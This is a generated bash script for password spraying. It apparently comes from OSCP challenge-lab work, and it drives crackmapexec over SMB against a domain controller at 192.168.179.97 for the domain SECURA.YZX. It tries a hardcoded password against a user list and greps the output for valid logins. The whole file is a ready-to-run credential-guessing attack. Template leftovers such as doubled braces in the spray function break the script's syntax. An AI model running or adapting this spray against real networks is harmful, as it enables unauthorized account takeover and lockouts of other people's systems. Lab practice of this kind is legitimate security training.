#!/bin/bash
#
# Auto Password Spray Script
# Generated: 2025-12-14 12:04:26
#
# Target Domain: SECURA.YZX
# DC IP: 192.168.179.97
# Tool: crackmapexec
#
# REVIEW THIS SCRIPT BEFORE EXECUTING
# Ensure lockout policy is correctly configured
#
# Usage: bash spray.sh
#

set -e  # Exit on error

# Configuration
DOMAIN="SECURA.YZX"
DC_IP="192.168.179.97"
USER_FILE="/home/kali/Desktop/KaliBackup/OSCP/challengeLabs/0_Secura/spray_output/users.txt"
OUTPUT_DIR="/home/kali/Desktop/KaliBackup/OSCP/challengeLabs/0_Secura/spray_output"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}     Auto Password Spray - crackmapexec${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""
echo "Domain: $DOMAIN"
echo "DC IP: $DC_IP"
echo "Users: $(wc -l < $USER_FILE) targets"
echo ""

# Function to wait with countdown
wait_for_window() {
    local seconds=$1
    local minutes=$((seconds / 60))

    echo -e "${YELLOW}[*] Waiting $minutes minutes for lockout window...${NC}"

    while [ $seconds -gt 0 ]; do
        mins=$((seconds / 60))
        secs=$((seconds % 60))
        printf "\r    Time remaining: %02d:%02d " $mins $secs
        sleep 1
        seconds=$((seconds - 1))
    done

    echo ""
    echo -e "${GREEN}[+] Ready for next round${NC}"
    echo ""
}


# Spray with CrackMapExec
spray_password() {{
    local password="$1"
    local round="$2"

    echo -e "${{BLUE}}[Round $round] Testing: $password${{NC}}"

    crackmapexec smb $DC_IP -u $USER_FILE -p "$password" -d $DOMAIN --continue-on-success 2>&1 | tee -a "$OUTPUT_DIR/spray_results.txt"

    # Check for successes
    if grep -q "\[\+\]" "$OUTPUT_DIR/spray_results.txt" 2>/dev/null; then
        echo -e "${{GREEN}}[+] Potential valid credentials found!${{NC}}"
    fi

    echo ""
}}

# Confirmation
echo -e "${YELLOW}About to spray 1 passwords against $(wc -l < $USER_FILE) users${NC}"
echo -e "${YELLOW}Tool: crackmapexec${NC}"
echo ""
read -p "Continue? (y/N) " confirm
if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
    echo "Aborted."
    exit 0
fi
echo ""

# Initialize results file
echo "# Spray Results - $(date)" > "$OUTPUT_DIR/spray_results.txt"
echo "" >> "$OUTPUT_DIR/spray_results.txt"


# === Round 1 ===
echo -e "${BLUE}=== Round 1/1 ===${NC}"
echo "Passwords: 1"
echo ""

spray_password 'EricLikesRunning800' 1

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}     Spray Complete${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo "Results saved to: $OUTPUT_DIR/spray_results.txt"
echo ""

# Show summary
if [ -f "$OUTPUT_DIR/spray_results.txt" ]; then
    echo "Valid credentials found:"
    grep -E "\[\+\]|VALID LOGIN" "$OUTPUT_DIR/spray_results.txt" 2>/dev/null || echo "  (none)"
fi
